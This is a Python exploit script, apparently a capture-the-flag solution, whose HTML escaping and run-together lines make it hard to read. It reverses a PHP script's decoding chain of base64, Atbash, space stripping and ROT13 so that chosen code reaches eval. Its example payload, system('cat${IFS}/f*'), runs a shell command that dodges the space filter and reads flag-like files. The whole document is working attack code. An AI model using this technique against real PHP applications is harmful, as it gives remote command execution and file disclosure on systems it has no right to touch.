import base64import stringdef atbash(text):    &quot;&quot;&quot;    Apply Atbash cipher to the text.    Atbash is its own inverse.    &quot;&quot;&quot;    result = &#x27;&#x27;    for char in text:        if char.isalpha():            is_upper = char.isupper()            base = ord(&#x27;A&#x27;) if is_upper else ord(&#x27;a&#x27;)            offset = ord(char.lower()) - ord(&#x27;a&#x27;)            new_char = chr(base + (25 - offset))            result += new_char        else:            result += char    return resultdef rot13(text):    &quot;&quot;&quot;    Apply ROT13 cipher to the text.    ROT13 is its own inverse.    &quot;&quot;&quot;    trans = str.maketrans(        string.ascii_lowercase + string.ascii_uppercase,        string.ascii_lowercase[13:] + string.ascii_lowercase[:13] +        string.ascii_uppercase[13:] + string.ascii_uppercase[:13]    )    return text.translate(trans)def craft_payload(mycode):    &quot;&quot;&quot;    Craft the base64-encoded payload for the PHP script.        Args:        mycode (str): The PHP code to execute via eval (without spaces).        Returns:        str: The base64-encoded cipher value to POST.    &quot;&quot;&quot;    # Step 1: Apply ROT13 to mycode (reverse of str_rot13)    inter = rot13(mycode)        # Step 2: Since spaces are removed after atbash, ensure no spaces in inter    # (assuming mycode has no spaces; adjust if needed)    if &#x27; &#x27; in inter:        raise ValueError(&quot;Input code should not introduce spaces after ROT13&quot;)        # Step 3: Apply atbash to inter (reverse of atbash)    decoded = atbash(inter)        # Step 4: Base64 encode the decoded    payload = base64.b64encode(decoded.encode(&#x27;utf-8&#x27;)).decode(&#x27;utf-8&#x27;)        return payload# Example usage:if __name__ == &quot;__main__&quot;:    mycode = &quot;system(&#x27;cat$&#123;IFS&#125;/f*&#x27;);&quot;        cipher = craft_payload(mycode)    print(f&quot;POST cipher: &#123;cipher&#125;&quot;)    print(&quot;\nVerification (forward simulation):&quot;)    dec = base64.b64decode(cipher.encode(&#x27;utf-8&#x27;)).decode(&#x27;utf-8&#x27;)    atb = atbash(dec)    no_space = atb.replace(&#x27; &#x27;, &#x27;&#x27;)    rot = rot13(no_space)    print(f&quot;Eval code: &#123;rot&#125;&quot;)


